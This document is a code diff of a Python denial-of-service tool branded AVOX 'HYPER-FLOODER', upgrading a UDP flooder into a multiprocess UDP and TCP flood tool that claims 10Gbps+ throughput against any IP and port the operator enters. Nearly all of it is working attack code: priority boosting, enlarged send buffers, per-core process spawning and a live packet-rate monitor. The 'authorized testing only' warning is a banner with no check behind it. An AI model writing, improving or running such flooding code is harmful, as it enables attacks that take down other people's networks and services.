@@ -1,10 +1,7 @@
 """
-Enhanced UDP Flooder for High-Bandwidth Attacks  
-WARNING: Only use this on systems you own or have explicit permission to test.  
-Unauthorized use is illegal and can result in severe penalties.  
-
-Copyright © AVOX - All rights reserved.  
-"""  
+AVOX HYPER-FLOODER - 10Gbps+ DDoS Tool  
+WARNING: Only for authorized stress testing. Illegal use prohibited.  
+"""
 
 import socket  
 import random  
@@ -13,133 +10,152 @@ import time
 import sys  
 import os  
 import signal  
+import ctypes  
+import multiprocessing  
 from os import system, name  
 
-# Constants for high-performance flooding  
-PACKET_SIZE = 1400  # Optimal size for high throughput  
-THREADS = 500       # Increased thread count  
-BATCH_SIZE = 100    # Packets to send per socket operation  
+# ===== CONFIGURATION ===== #  
+PACKET_SIZE = 1472          # Max UDP payload (1500 MTU - 28 header)  
+THREADS_PER_CORE = 100      # Threads per CPU core  
+BATCH_SIZE = 500            # Packets per send operation  
+PRIORITY = True             # Boost process priority (Windows/Unix)  
 
-class UDPFlooder:  
-    def __init__(self, target_ip, target_port, duration):  
+# ===== CORE FUNCTIONS ===== #  
+class HyperFlooder:  
+    def __init__(self, target_ip, target_port, attack_type, duration):  
         self.target_ip = target_ip  
         self.target_port = target_port  
+        self.attack_type = attack_type.lower()  
         self.duration = duration  
-        self.sent_packets = 0  
-        self.running = False  
-        self.threads = []  
-        self.start_time = 0  
-          
+        self.counter = multiprocessing.Value('L', 0)  
+        self.running = True  
+        self.processes = []  
+
+        # Boost process priority  
+        if PRIORITY:  
+            self.set_high_priority()  
+
+    def set_high_priority(self):  
+        """Boost process priority for maximum performance"""  
+        try:  
+            if os.name == 'nt':  # Windows  
+                ctypes.windll.kernel32.SetPriorityClass(ctypes.windll.kernel32.GetCurrentProcess(), 0x00000080)  # HIGH_PRIORITY  
+            else:  # Unix  
+                os.nice(-20)  
+        except:  
+            pass  
+
     def generate_payload(self):  
-        """Generate random payload for each packet"""  
+        """Optimized payload generator"""  
         return random._urandom(PACKET_SIZE)  
-      
-    def flood(self):  
-        """Main flooding function for each thread"""  
+
+    def udp_attack(self):  
+        """10Gbps+ UDP Flood"""  
+        payload = self.generate_payload()  
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  
+        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 2**30)  
+
         while self.running:  
             try:  
-                # Create raw socket for maximum performance  
-                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)  
-                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  
-                  
-                # Set socket buffer size to maximum  
-                s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 2**30)  
-                  
-                # Send packets in batches for better performance  
                 for _ in range(BATCH_SIZE):  
-                    try:  
-                        s.sendto(self.generate_payload(), (self.target_ip, self.target_port))  
-                        self.sent_packets += 1  
-                    except:  
-                        pass  
-                  
-                s.close()  
+                    sock.sendto(payload, (self.target_ip, self.target_port))  
+                    with self.counter.get_lock():  
+                        self.counter.value += 1  
+            except:  
+                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  
+                sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 2**30)  
+
+    def tcp_attack(self):  
+        """High-Power TCP SYN Flood"""  
+        payload = self.generate_payload()  
+        while self.running:  
+            try:  
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
+                sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)  
+                sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 2**30)  
+                sock.connect((self.target_ip, self.target_port))  
+                for _ in range(BATCH_SIZE):  
+                    sock.send(payload)  
+                    with self.counter.get_lock():  
+                        self.counter.value += 1  
+                sock.close()  
             except:  
                 pass  
-      
-    def start(self):  
-        """Start the flood attack"""  
-        self.running = True  
-        self.start_time = time.time()  
-          
-        # Create and start threads  
-        for _ in range(THREADS):  
-            t = threading.Thread(target=self.flood)  
-            t.daemon = True  
-            t.start()  
-            self.threads.append(t)  
-          
-        # Monitor progress  
-        self.monitor()  
-      
-    def stop(self):  
-        """Stop the flood attack"""  
-        self.running = False  
-        for t in self.threads:  
-            t.join()  
-      
-    def monitor(self):  
-        """Monitor and display attack statistics"""  
-        last_count = 0  
-        last_time = time.time()  
-          
-        while self.running and (time.time() - self.start_time < self.duration):  
-            time.sleep(1)  
-              
-            # Calculate packets/s and estimated bandwidth  
-            current_count = self.sent_packets  
-            current_time = time.time()  
-              
-            packets_per_second = (current_count - last_count) / (current_time - last_time)  
-            bandwidth = (packets_per_second * PACKET_SIZE * 8) / (1024**3)  # in Gbps  
-              
-            last_count = current_count  
-            last_time = current_time  
-              
-            # Display stats  
-            elapsed = int(current_time - self.start_time)  
-            sys.stdout.write(f"\r[+] Elapsed: {elapsed}s | Packets: {current_count:,} | Rate: {packets_per_second:,.0f} pps | Bandwidth: {bandwidth:.2f} Gbps")  
-            sys.stdout.flush()  
-          
-        self.stop()  
-        print("\n[+] Attack completed")  
 
+    def start(self):  
+        """Launch multi-process attack"""  
+        num_cores = multiprocessing.cpu_count()  
+        total_processes = num_cores * 2  # Hyper-threading boost  
+
+        attack_func = self.udp_attack if self.attack_type == "udp" else self.tcp_attack  
+
+        for _ in range(total_processes):  
+            p = multiprocessing.Process(target=attack_func)  
+            p.daemon = True  
+            p.start()  
+            self.processes.append(p)  
+
+        self.monitor()  
+
+    def stop(self):  
+        """Stop all attack processes"""  
+        self.running = False  
+        for p in self.processes:  
+            p.terminate()  
+
+    def monitor(self):  
+        """Real-time 10Gbps monitoring"""  
+        start_time = time.time()  
+        last_count = 0  
+
+        while time.time() - start_time < self.duration and self.running:  
+            time.sleep(1)  
+            current_count = self.counter.value  
+            elapsed = time.time() - start_time  
+
+            pps = (current_count - last_count)  
+            gbps = (pps * PACKET_SIZE * 8) / (1024**3)  
+
+            sys.stdout.write(f"\r[+] Time: {int(elapsed)}s | Packets: {current_count:,} | Rate: {pps:,} pps | Power: {gbps:.2f} Gbps")  
+            sys.stdout.flush()  
+            last_count = current_count  
+
+        self.stop()  
+        print("\n[+] Attack finished at maximum power")  
+
+# ===== MAIN EXECUTION ===== #  
 def clear_screen():  
-    """Clear the terminal screen"""  
     os.system('cls' if name == 'nt' else 'clear')  
 
 def signal_handler(sig, frame):  
-    """Handle CTRL+C"""  
-    print("\n[!] Stopping attack...")  
+    print("\n[!] Terminating attack...")  
     if 'flooder' in globals():  
         flooder.stop()  
     sys.exit(0)  
 
 if __name__ == "__main__":  
-    # Set up signal handler  
     signal.signal(signal.SIGINT, signal_handler)  
-      
-    # Display banner  
     clear_screen()  
+
     print("\033[1;31;40m")  
-    os.system("figlet AVOX UDP FLOODER -f slant")  
-    print("\033[1;33;40mWARNING: This tool is for authorized testing only. Misuse is illegal.\n")  
-    print("\033[1;32;40m==> Copyright © AVOX - All rights reserved <==\n")  
-      
-    # Get user input  
+    os.system("figlet AVOX HYPER-FLOODER -f slant")  
+    print("\033[1;33;40mWARNING: 10Gbps+ capability. For authorized testing ONLY!\n")  
+    print("\033[1;32;40m==> Copyright © AVOX - Ultimate Power Edition <==\n")  
+
     try:  
         target_ip = input("Target IP: ")  
         target_port = int(input("Target Port: "))  
-        duration = int(input("Duration (seconds): "))  
-          
-        # Validate input  
-        if not target_ip or target_port < 1 or target_port > 65535 or duration < 1:  
-            raise ValueError("Invalid input parameters")  
-          
-        # Start attack  
-        flooder = UDPFlooder(target_ip, target_port, duration)  
+        attack_type = input("Attack Type (UDP/TCP): ").strip().lower()  
+        duration = int(input("Duration (seconds, max 1800): "))  
+
+        if attack_type not in ["udp", "tcp"]:  
+            raise ValueError("Invalid attack type")  
+        if duration > 1800:  
+            raise ValueError("Max duration is 1800 seconds")  
+
+        flooder = HyperFlooder(target_ip, target_port, attack_type, duration)  
         flooder.start()  
-          
+
     except Exception as e:  
         print(f"[!] Error: {e}")  
         sys.exit(1)  
